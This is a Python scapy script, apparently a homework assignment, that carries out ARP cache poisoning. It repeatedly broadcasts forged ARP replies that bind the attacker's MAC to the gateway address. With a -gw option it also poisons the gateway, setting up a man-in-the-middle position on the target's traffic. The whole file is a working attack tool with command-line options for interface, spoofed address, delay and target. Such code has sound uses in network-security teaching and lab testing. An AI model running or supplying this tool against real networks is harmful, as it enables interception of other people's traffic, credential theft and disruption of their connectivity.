import argparse, time
from scapy.all import *
from scapy.layers.l2 import Ether, ARP

interface = conf.iface                  # Default interface
src = conf.route.route('0.0.0.0')[2]    # Default gateway
DELAY = 2                               # Default delay time between broadcasts

parser = argparse.ArgumentParser()      # Activates ArgumentParser into parser

# All the arguments we need for the homework
parser.add_argument('-i', '--interface', type=str,               help='Decide what interface to use')
parser.add_argument('-s', '--src',       type=str,               help='The address you want for the attacker')
parser.add_argument('-d', '--delay',     type=float,             help='Delay (in seconds) between messages')
parser.add_argument('-gw',               action='store_true',    help='Should GW be attacked as well')
parser.add_argument('-t', '--target',    type=str, required=True,help='IP of target')

# Puts all the arguments together
args = parser.parse_args()

# Checks if there is an inputted argument for interface if there is update otherwise use default
if args.interface:
    interface = args.interface

# Checks if there is an inputted argument for src if there is update otherwise use default
if args.src:
    src = args.src

# Checks if there is an inputted argument for delay if there is update otherwise use default
if args.delay:
    DELAY = args.delay

# Sets target to inputted target which is a mandatory field (no default) if no input return error
target = args.target

# If input doesn't include gw then only spoof target
if not args.gw:
    while True:
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
        # print("sending '" + src + " is at ' to " + target + " using " + interface) needs to send mac so it isn't 00:00...
        sendp(arp_request, iface=interface)
        time.sleep(DELAY)

# Else (-gw is inputted) then man in the middle target
else:
    while True:
        arp_request_for_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
        # print("sending '" + src + " is at ' to " + target + " using " + interface) needs to send mac so it isn't 00:00...
        sendp(arp_request_for_target, iface=interface)
        arp_request_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=src, psrc=target, hwsrc=get_if_hwaddr(interface))
        # print("sending '" + target + " is at ' to " + src + " using " + interface) needs to send mac so it isn't 00:00...
        sendp(arp_request_for_gateway, iface=interface)
        time.sleep(DELAY)